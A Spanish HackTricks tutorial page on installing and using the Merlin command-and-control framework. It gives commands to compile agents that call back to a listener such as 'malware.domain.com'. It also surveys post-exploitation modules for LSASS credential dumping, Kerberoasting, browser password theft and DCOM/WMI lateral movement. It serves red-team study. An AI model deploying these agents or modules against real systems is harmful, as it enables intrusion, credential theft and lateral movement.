<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Instalación

## Instalar GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Instalación de Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Iniciar el Servidor Merlin
```
go run cmd/merlinserver/main.go -i
```
# Agentes Merlin

Puedes [descargar agentes precompilados](https://github.com/Ne0nd0g/merlin/releases)

## Compilar Agentes

Ve a la carpeta principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Compilación manual de agentes**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Módulos

**La mala noticia es que cada módulo utilizado por Merlin se descarga de la fuente (Github) y se guarda en disco antes de usarlo. ¡Ten cuidado al usar módulos conocidos porque Windows Defender te atrapará!**

**SafetyKatz** --> Mimikatz modificado. Volcar LSASS a archivo y lanzar: sekurlsa::logonpasswords a ese archivo\
**SharpDump** --> minivolcado para el ID de proceso especificado (LSASS por defecto) (Dice que la extensión del archivo final es .gz pero en realidad es .bin, pero es un archivo gz)\
**SharpRoast** --> Kerberoast (no funciona)\
**SeatBelt** --> Pruebas de Seguridad Local en CS (no funciona) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compilar usando csc.exe /unsafe\
**Sharp-Up** --> Todas las comprobaciones en C# en powerup (funciona)\
**Inveigh** --> Spoofing de PowerShellADIDNS/LLMNR/mDNS/NBNS y herramienta man-in-the-middle (no funciona, necesita cargar: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Suplanta a todos los usuarios disponibles y recupera un desafío-respuesta para cada uno (hash NTLM para cada usuario) (URL incorrecta)\
**Invoke-PowerThIEf** --> Robar formularios de IExplorer o hacer que ejecute JS o inyectar un DLL en ese proceso (no funciona) (y parece que el PS tampoco funciona) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obtener contraseñas del navegador (funciona pero no imprime el directorio de salida)\
**dumpCredStore** --> API del Administrador de Credenciales Win32 (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Detectar inyección clásica en procesos en ejecución (Inyección Clásica (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (no funciona)\
**Get-OSTokenInformation** --> Obtener información de Token de los procesos y hilos en ejecución (Usuario, grupos, privilegios, propietario... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Ejecutar un comando (en otro ordenador) a través de DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Ejecutar un comando en otro PC abusando de objetos COM de PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Ejecutar un comando en otro PC abusando de DCOM en Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (no funciona) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Volca todas las partes más interesantes de la política de grupo y luego busca en ellas cosas explotables. (obsoleto) Echa un vistazo a Grouper2, parece realmente bueno\
**Invoke-WMILM** --> WMI para moverse lateralmente\
**Get-GPPPassword** --> Buscar groups.xml, scheduledtasks.xml, services.xml y datasources.xml y devuelve contraseñas en texto plano (dentro del dominio)\
**Invoke-Mimikatz** --> Usar mimikatz (volcado de credenciales por defecto)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Verificar los privilegios de los usuarios en computadoras\
**Find-PotentiallyCrackableAccounts** --> Recuperar información sobre cuentas de usuario asociadas con SPN (Kerberoasting)\
**psgetsystem** --> obtener sistema

**No se revisaron los módulos de persistencia**

# Resumen

Realmente me gusta la sensación y el potencial de la herramienta.\
Espero que la herramienta comience a descargar los módulos del servidor e integre algún tipo de evasión al descargar scripts.

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de Github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
